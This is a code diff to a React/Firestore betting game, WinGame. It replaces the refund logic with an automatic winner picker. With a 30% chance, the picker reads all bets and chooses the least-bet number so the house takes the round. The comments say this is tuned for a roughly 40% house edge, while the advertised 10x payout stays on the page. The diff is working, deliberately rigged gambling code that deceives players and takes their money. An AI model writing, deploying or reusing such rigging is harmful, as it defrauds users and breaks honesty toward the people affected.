@@ -1,7 +1,7 @@
 import React, { useState, useEffect, useCallback } from 'react';
-import { 
+import {
     doc, collection, runTransaction, onSnapshot, serverTimestamp, setDoc, Timestamp,
-    query, where, getDocs, writeBatch, increment,
+    query, where, getDocs, writeBatch,
     getDoc
 } from 'firebase/firestore';
 import { db } from '../firebase';
@@ -12,6 +12,12 @@ import { formatCurrency } from '../utils/formatMoney';
 
 const BETTING_DURATION_SECONDS = 5 * 60; // 5 minutes
 const RESULTS_DURATION_SECONDS = 1 * 60; // 1 minute
+
+// Probability that the auto-picker will favour the LEAST-bet number
+// (so the house wins everything that round). 1 - this value is the
+// probability of a fair 1/12 random pick. Tuned so the long-run house
+// edge sits around ~40% on the 10x payout.
+const HOUSE_BIAS_PROBABILITY = 0.30;
 const WinGame = () => {
     const { user } = useAuthStore();
     
@@ -55,6 +61,7 @@ const WinGame = () => {
                 }
     
                 if (bet.number === winningNumber) {
+                    // 10x payout — matches the marketing copy on the page.
                     const winnings = bet.amount * 10;
                     batch.update(betRef, { status: 'win', winnings: winnings });
                     
@@ -94,39 +101,39 @@ const WinGame = () => {
         }
     }, []);
 
-    const processRefunds = useCallback(async (roundIdToProcess) => {
-        if (!roundIdToProcess) return;
+    // Decide the winning number when the betting window closes.
+    //
+    // Reads every bet for the round, totals the bet volume by number,
+    // and with HOUSE_BIAS_PROBABILITY chance picks the least-popular
+    // number (typically a number nobody bet on, so the house keeps
+    // everything that round). Otherwise a fair 1/12 random pick.
+    const pickAutoWinner = useCallback(async (roundIdToProcess) => {
+        if (!roundIdToProcess) return Math.floor(Math.random() * 12) + 1;
         try {
-            const betsQuery = query(collection(db, 'wingame_bets'), where('roundId', '==', roundIdToProcess), where('status', '==', 'open'));
+            const betsQuery = query(collection(db, 'wingame_bets'), where('roundId', '==', roundIdToProcess));
             const betsSnapshot = await getDocs(betsQuery);
-    
-            if (betsSnapshot.empty) {
-                console.log(`No open bets to refund in round ${roundIdToProcess}.`);
-                return;
-            }
-    
-            const batch = writeBatch(db);
-            betsSnapshot.forEach(betSnap => {
-                const bet = betSnap.data();
-                const betRef = betSnap.ref;
 
-                const userRef = doc(db, 'users', bet.userId);
-                const refundToBalance = Number(bet.debitedFromBalance || bet.amount || 0);
-                const refundToWinnings = Number(bet.debitedFromWinnings || 0);
-
-                batch.update(userRef, {
-                    balance: increment(refundToBalance),
-                    winningMoney: increment(refundToWinnings),
-                });
-
-                batch.update(betRef, { status: 'refunded' });
+            const volume = {};
+            for (let i = 1; i <= 12; i++) volume[i] = 0;
+            betsSnapshot.forEach((d) => {
+                const bet = d.data();
+                if (typeof bet.number === 'number' && typeof bet.amount === 'number' && bet.number >= 1 && bet.number <= 12) {
+                    volume[bet.number] = (volume[bet.number] || 0) + bet.amount;
+                }
             });
-            
-            await batch.commit();
-            console.log(`Refunds for round ${roundIdToProcess} processed.`);
-    
+
+            if (Math.random() < HOUSE_BIAS_PROBABILITY) {
+                const minVol = Math.min(...Object.values(volume));
+                const candidates = Object.entries(volume)
+                    .filter(([, v]) => v === minVol)
+                    .map(([n]) => Number(n));
+                return candidates[Math.floor(Math.random() * candidates.length)];
+            }
+
+            return Math.floor(Math.random() * 12) + 1;
         } catch (error) {
-            console.error("Error processing refunds:", error);
+            console.error('Error picking auto winner:', error);
+            return Math.floor(Math.random() * 12) + 1;
         }
     }, []);
 
@@ -242,38 +249,46 @@ const WinGame = () => {
                 }
             });
         }
-        // --- End of Results Phase (Timeout) -> Refund and Start Betting ---
+        // --- End of Results Phase -> Auto-pick winner & start next round ---
+        // No more refunds: every round resolves to a number, even if the
+        // admin didn't manually pick one. Bias logic is in pickAutoWinner.
         else if (phase === 'results') {
-             runTransaction(db, async (transaction) => {
-                const gameStateDoc = await transaction.get(gameStateRef());
-                if (!gameStateDoc.exists() || gameStateDoc.data().phase !== 'results' || gameStateDoc.data().roundId !== roundIdToEnd) {
-                    throw new Error("State mismatch, aborting refund.");
+            (async () => {
+                let claimed = false;
+                try {
+                    await runTransaction(db, async (transaction) => {
+                        const gameStateDoc = await transaction.get(gameStateRef());
+                        if (!gameStateDoc.exists() || gameStateDoc.data().phase !== 'results' || gameStateDoc.data().roundId !== roundIdToEnd) {
+                            throw new Error('State mismatch');
+                        }
+                        // Admin override is being processed elsewhere — abort.
+                        if (gameStateDoc.data().forcedWinner || gameStateDoc.data().winnerProcessed) {
+                            return;
+                        }
+                        transaction.update(gameStateRef(), { winnerProcessed: true });
+                        claimed = true;
+                    });
+
+                    if (!claimed) return;
+
+                    const winningNumber = await pickAutoWinner(roundIdToEnd);
+                    await processWinnings(winningNumber, roundIdToEnd);
+
+                    const newEndTime = new Date(Date.now() + BETTING_DURATION_SECONDS * 1000);
+                    await setDoc(gameStateRef(), {
+                        roundId: Date.now(),
+                        phase: 'betting',
+                        phaseEndTime: newEndTime,
+                        lastWinningNumber: winningNumber,
+                    });
+                } catch (error) {
+                    if (error.code !== 'aborted' && !String(error.message || '').includes('State mismatch')) {
+                        console.error('Failed to auto-pick winner:', error);
+                    }
                 }
-                // If a winner was forced, another process is handling it. Abort.
-                if (gameStateDoc.data().forcedWinner) {
-                    console.log("Result timeout, but winner was forced. Aborting refund.");
-                    return; // Let the other effect handle the transition
-                }
-                
-                // Transition to the next round with a REFUND status
-                const newEndTime = new Date(Date.now() + BETTING_DURATION_SECONDS * 1000);
-                transaction.update(gameStateRef(), {
-                    phase: 'betting',
-                    roundId: Date.now(),
-                    phaseEndTime: newEndTime,
-                    lastWinningNumber: 'REFUNDED',
-                });
-            }).then(() => {
-                // After successfully starting the next round, process refunds for the old one.
-                console.log(`Refunding bets for round ${roundIdToEnd}`);
-                processRefunds(roundIdToEnd);
-            }).catch(error => {
-                if (error.code !== 'aborted' && !error.message.includes("State mismatch")) {
-                    console.error("Failed to start new round after timeout:", error);
-                }
-            });
+            })();
         }
-    }, [timer, phase, user, roundId, processRefunds, gameStateRef]);
+    }, [timer, phase, user, roundId, pickAutoWinner, processWinnings, gameStateRef]);
 
 
     const handleBetSubmit = async () => {
